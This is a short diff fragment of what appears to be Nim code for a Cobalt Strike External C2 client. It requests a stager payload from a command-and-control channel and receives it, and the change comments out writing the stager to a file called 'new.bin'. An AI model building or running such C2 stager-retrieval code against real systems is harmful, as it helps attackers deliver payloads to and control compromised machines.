@@ -48,7 +48,7 @@ CSsend(externalc2,"go")
 
 echo "[+] Requested C2 For Stager"
 var (stagerlen,data) = CSrecv(externalc2)
-writeFile("new.bin", data)
+#writeFile("new.bin", data) #checkStager
 echo "[+] Stager received with Length 4 bytes : " , stagerlen
 echo "[+] Stager received with Length : " , len(data)
 
